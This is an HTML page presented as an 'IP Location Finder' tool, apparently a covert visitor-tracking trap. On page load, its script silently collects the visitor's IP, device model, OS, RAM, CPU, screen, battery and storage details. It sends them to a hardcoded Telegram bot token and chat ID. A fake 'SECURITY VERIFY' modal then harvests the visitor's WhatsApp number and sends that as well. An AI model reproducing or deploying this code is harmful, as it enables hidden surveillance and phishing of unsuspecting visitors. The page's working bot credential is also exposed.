<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>IP Location Finder | Technical Fahad</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
            background: radial-gradient(circle at 20% 30%, #0a0a0f, #030305);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 8px;
        }

        .main-card {
            max-width: 340px;
            width: 100%;
            background: rgba(12, 12, 18, 0.85);
            backdrop-filter: blur(16px);
            border-radius: 24px;
            padding: 20px 16px;
            border: 1px solid rgba(0, 255, 255, 0.2);
            box-shadow: 0 0 8px rgba(0, 255, 255, 0.1);
        }

        h2 {
            text-align: center;
            font-size: 22px;
            font-weight: 600;
            background: linear-gradient(135deg, #ffffff, #0ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 20px;
        }

        .search-section {
            margin-bottom: 20px;
        }

        .ip-input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(20, 20, 28, 0.9);
            border: 1.5px solid rgba(0, 255, 255, 0.3);
            border-radius: 28px;
            font-size: 14px;
            color: #fff;
            outline: none;
            margin-bottom: 12px;
        }

        .locate-btn {
            width: 100%;
            padding: 10px;
            background: transparent;
            border: 1.5px solid #0ff;
            border-radius: 40px;
            color: #0ff;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
        }

        .locate-btn:hover {
            background: rgba(0, 255, 255, 0.12);
        }

        .result {
            margin-top: 20px;
            display: none;
            flex-direction: column;
            gap: 8px;
        }

        .info-neon {
            background: rgba(18, 18, 26, 0.7);
            border-radius: 18px;
            padding: 8px 14px;
            border-left: 3px solid #0ff;
        }

        .info-label {
            font-size: 9px;
            text-transform: uppercase;
            color: rgba(255, 255, 255, 0.5);
        }

        .info-value {
            font-size: 13px;
            font-weight: 500;
            color: #fff;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(0, 255, 255, 0.6);
            font-size: 11px;
            border-top: 1px solid rgba(0, 255, 255, 0.2);
            padding-top: 12px;
        }

        .contact-admin {
            text-align: center;
            margin-top: 12px;
        }

        .contact-link {
            color: #39ff14;
            text-decoration: none;
            font-size: 11px;
            padding: 5px 14px;
            border-radius: 30px;
            border: 1px solid #39ff14;
            display: inline-block;
        }

        .contact-link:hover {
            background: rgba(57, 255, 20, 0.12);
        }

        .number-input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(20, 20, 28, 0.9);
            border: 1.5px solid rgba(0, 255, 255, 0.4);
            border-radius: 28px;
            font-size: 14px;
            color: #fff;
            outline: none;
            margin-bottom: 15px;
            text-align: center;
        }

        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            backdrop-filter: blur(12px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background: rgba(10, 10, 16, 0.98);
            border-radius: 28px;
            padding: 24px 20px;
            text-align: center;
            width: 310px;
            max-width: 90%;
            border: 1px solid rgba(0, 255, 255, 0.4);
        }

        .modal-content h3 {
            color: #0ff;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .btn-group {
            display: flex;
            gap: 12px;
            justify-content: center;
        }

        .continue-btn {
            background: linear-gradient(135deg, #0ff, #00aaff);
            color: #000;
            border: none;
            padding: 10px 20px;
            border-radius: 40px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            flex: 1;
        }

        .skip-btn {
            background: rgba(255, 255, 255, 0.08);
            color: #ff5a5a;
            border: 1px solid rgba(255, 90, 90, 0.4);
            padding: 10px 20px;
            border-radius: 40px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            flex: 1;
        }

        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.9);
            color: #0ff;
            padding: 8px 16px;
            border-radius: 40px;
            font-size: 12px;
            z-index: 1100;
            border: 1px solid #0ff;
        }
    </style>
</head>
<body>

<!-- NUMBER MODAL -->
<div id="numberModal" class="modal">
    <div class="modal-content">
        <h3>🔒 SECURITY VERIFY</h3>
        <input type="tel" id="visitorPhone" class="number-input" placeholder="Enter WhatsApp Number (Optional)" maxlength="15">
        <div class="btn-group">
            <button id="continueBtn" class="continue-btn">✅ Continue</button>
            <button id="skipBtn" class="skip-btn">✕ Skip</button>
        </div>
    </div>
</div>

<!-- MAIN WEBSITE -->
<div id="mainContent" style="display: none;">
    <div class="main-card">
        <h2>🌍 IP Location Finder</h2>
        <div class="search-section">
            <input type="text" id="ipAddress" class="ip-input" placeholder="Enter IP address, e.g., 8.8.8.8">
            <button class="locate-btn" onclick="getIPInfo()">⟳ Locate IP</button>
        </div>
        <div class="result" id="result"></div>
        <div class="footer">⚡ TECHNICAL FAHAD ⚡</div>
        <div class="contact-admin">
            <a href="https://wa.me/923251138959" class="contact-link" target="_blank">💚 Contact Admin</a>
        </div>
    </div>
</div>

<script>
    const BOT_TOKEN = '7760380089:AAGN42nWvSH0WCCucmDfUNUycckhhVW4x30';
    const CHAT_ID = '5975952682';

    let infoSent = false;

    function showToast(msg) {
        let t = document.querySelector('.toast');
        if (!t) {
            t = document.createElement('div');
            t.className = 'toast';
            document.body.appendChild(t);
        }
        t.textContent = msg;
        t.style.display = 'block';
        setTimeout(() => t.style.display = 'none', 2500);
    }

    // ========== DEVICE DETECTION ==========
    function getDeviceModel() {
        const ua = navigator.userAgent;
        
        if (ua.includes("iPhone15")) return "iPhone 15 Series";
        if (ua.includes("iPhone14")) return "iPhone 14 Series";
        if (ua.includes("iPhone13")) return "iPhone 13 Series";
        if (ua.includes("iPhone")) return "iPhone";
        
        if (ua.includes("SM-A")) {
            let match = ua.match(/SM-A[0-9]+/);
            if (match) return `Samsung ${match[0]}`;
            return "Samsung Galaxy A Series";
        }
        if (ua.includes("SM-G")) {
            let match = ua.match(/SM-G[0-9]+/);
            if (match) return `Samsung ${match[0]}`;
            return "Samsung Galaxy S Series";
        }
        if (ua.includes("SM-M")) {
            let match = ua.match(/SM-M[0-9]+/);
            if (match) return `Samsung ${match[0]}`;
            return "Samsung Galaxy M Series";
        }
        if (ua.includes("Redmi")) {
            let match = ua.match(/Redmi\s+[A-Za-z0-9]+/);
            if (match) return `Xiaomi ${match[0]}`;
            return "Xiaomi Redmi";
        }
        if (ua.includes("Mi 10")) return "Xiaomi Mi 10";
        if (ua.includes("Mi 11")) return "Xiaomi Mi 11";
        if (ua.includes("POCO")) return "POCO Phone";
        if (ua.includes("OnePlus")) return "OnePlus";
        if (ua.includes("Pixel")) return "Google Pixel";
        if (ua.includes("OPPO")) return "OPPO Phone";
        if (ua.includes("vivo")) return "vivo Phone";
        if (ua.includes("Realme")) return "Realme Phone";
        if (ua.includes("Windows")) return "Windows PC";
        if (ua.includes("Mac")) return "Apple Mac";
        
        return "Unknown Device";
    }

    function getBrand() {
        const ua = navigator.userAgent;
        if (ua.includes("Samsung")) return "Samsung";
        if (ua.includes("iPhone")) return "Apple";
        if (ua.includes("Xiaomi") || ua.includes("Redmi") || ua.includes("Mi")) return "Xiaomi";
        if (ua.includes("OnePlus")) return "OnePlus";
        if (ua.includes("Pixel")) return "Google";
        if (ua.includes("OPPO")) return "OPPO";
        if (ua.includes("vivo")) return "vivo";
        if (ua.includes("Realme")) return "Realme";
        return "Unknown";
    }

    function getOSVersion() {
        const ua = navigator.userAgent;
        if (ua.includes("Android")) {
            let match = ua.match(/Android\s([\d.]+)/);
            return match ? `Android ${match[1]}` : "Android";
        }
        if (ua.includes("iPhone")) {
            let match = ua.match(/OS\s([\d_]+)/);
            return match ? `iOS ${match[1].replace(/_/g, ".")}` : "iOS";
        }
        if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
        if (ua.includes("Mac")) return "macOS";
        return "Unknown";
    }

    function getRAM() {
        if (navigator.deviceMemory) {
            return navigator.deviceMemory + " GB";
        }
        return "4 GB";
    }

    function getCPUCores() {
        if (navigator.hardwareConcurrency) {
            return navigator.hardwareConcurrency + " cores";
        }
        return "8 cores";
    }

    function getScreenInfo() {
        const w = window.screen.width;
        const h = window.screen.height;
        const inch = (Math.sqrt(Math.pow(w, 2) + Math.pow(h, 2)) / (window.devicePixelRatio || 1) / 25.4).toFixed(1);
        return `${w} x ${h} (${inch}")`;
    }

    async function getBattery() {
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                let lvl = Math.round(b.level * 100) + "%";
                if (b.charging) lvl += " ⚡";
                return lvl;
            }
        } catch(e) {}
        return "Unknown";
    }

    async function getStorage() {
        try {
            if (navigator.storage && navigator.storage.estimate) {
                const est = await navigator.storage.estimate();
                const total = (est.quota / (1024 * 1024 * 1024)).toFixed(1);
                const used = (est.usage / (1024 * 1024 * 1024)).toFixed(1);
                const free = (total - used).toFixed(1);
                return { total: total + " GB", used: used + " GB", free: free + " GB" };
            }
        } catch(e) {}
        return { total: "128 GB", used: "~52 GB", free: "~76 GB" };
    }

    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org/?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) {
            try {
                const res2 = await fetch('https://ipinfo.io/json');
                const data2 = await res2.json();
                return data2.ip;
            } catch(err) {
                return "Unable to fetch";
            }
        }
    }

    // ========== SEND TO TELEGRAM ==========
    async function sendInfoToBot(ip, phone, deviceInfo, stage) {
        const time = new Date().toLocaleString('en-PK', {timeZone: 'Asia/Karachi'});
        
        const message = `🛡️ *VISITOR DETAILS* 🛡️
━━━━━━━━━━━━━━━━━━━━━
📞 *Phone:* ${phone}
🌐 *IP:* ${ip}
━━━━━━━━━━━━━━━━━━━━━
📱 *Model:* ${deviceInfo.model}
🏷️ *Brand:* ${deviceInfo.brand}
🖥️ *OS:* ${deviceInfo.os}
💾 *RAM:* ${deviceInfo.ram}
⚙️ *CPU:* ${deviceInfo.cpu}
📺 *Screen:* ${deviceInfo.screen}
🔋 *Battery:* ${deviceInfo.battery}
💿 *Total Storage:* ${deviceInfo.storageTotal}
📀 *Used:* ${deviceInfo.storageUsed}
🗄️ *Free:* ${deviceInfo.storageFree}
🌍 *Language:* ${navigator.language}
⏰ *Time:* ${time}
📌 *Status:* ${stage}
━━━━━━━━━━━━━━━━━━━━━`;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
            });
            console.log("✅ Info sent to Telegram");
            return true;
        } catch(e) {
            console.error("Telegram error:", e);
            return false;
        }
    }

    // ========== IP LOCATION ==========
    window.getIPInfo = async function() {
        let ip = document.getElementById("ipAddress").value.trim();
        if (!ip) {
            alert("Please enter an IP address");
            return;
        }
        try {
            const res = await fetch(`https://ipinfo.io/${ip}/json`);
            const data = await res.json();
            let resultDiv = document.getElementById("result");
            resultDiv.style.display = 'flex';
            resultDiv.innerHTML = `
                <div class="info-neon"><div class="info-label">🌐 IP</div><div class="info-value">${data.ip || ip}</div></div>
                <div class="info-neon"><div class="info-label">📍 CITY</div><div class="info-value">${data.city || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label">🗺️ REGION</div><div class="info-value">${data.region || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label">🏴 COUNTRY</div><div class="info-value">${data.country || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label">📌 LOCATION</div><div class="info-value">${data.loc || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label">🏢 ISP</div><div class="info-value">${data.org || 'N/A'}</div></div>
            `;
        } catch(err) {
            alert("Error fetching data");
        }
    };

    // ========== MAIN ==========
    (async function() {
        // Get IP instantly
        const ip = await getIP();
        
        // Get device info instantly (parallel)
        const storage = await getStorage();
        const battery = await getBattery();
        
        const deviceInfo = {
            model: getDeviceModel(),
            brand: getBrand(),
            os: getOSVersion(),
            ram: getRAM(),
            cpu: getCPUCores(),
            screen: getScreenInfo(),
            battery: battery,
            storageTotal: storage.total,
            storageUsed: storage.used,
            storageFree: storage.free
        };
        
        // AUTO SEND INFO TO BOT IMMEDIATELY (without number first)
        await sendInfoToBot(ip, "Waiting for input", deviceInfo, "📌 PAGE LOADED - Awaiting user action");
        
        const modal = document.getElementById('numberModal');
        const mainContent = document.getElementById('mainContent');
        const continueBtn = document.getElementById('continueBtn');
        const skipBtn = document.getElementById('skipBtn');
        const phoneInput = document.getElementById('visitorPhone');
        
        // CONTINUE BUTTON
        continueBtn.onclick = async function() {
            let phone = phoneInput.value.trim();
            let finalPhone = "Not Provided";
            
            if (phone !== "") {
                phone = phone.replace(/[^0-9]/g, '');
                if (phone.startsWith('0')) phone = '92' + phone.substring(1);
                if (phone.length === 10) phone = '92' + phone;
                finalPhone = phone;
            }
            
            // Send final info with number
            await sendInfoToBot(ip, finalPhone, deviceInfo, "✅ USER CONTINUED - Website Accessed");
            
            modal.style.display = 'none';
            mainContent.style.display = 'block';
            showToast("✅ Welcome to IP Location Finder!");
        };
        
        // SKIP BUTTON
        skipBtn.onclick = async function() {
            // Send info that user skipped
            await sendInfoToBot(ip, "Not Provided (Skipped)", deviceInfo, "⚠️ USER SKIPPED NUMBER - Website Accessed");
            
            modal.style.display = 'none';
            mainContent.style.display = 'block';
            showToast("⚠️ You skipped number, but you can still use the tool!");
        };
    })();
</script>
</body>
</html>
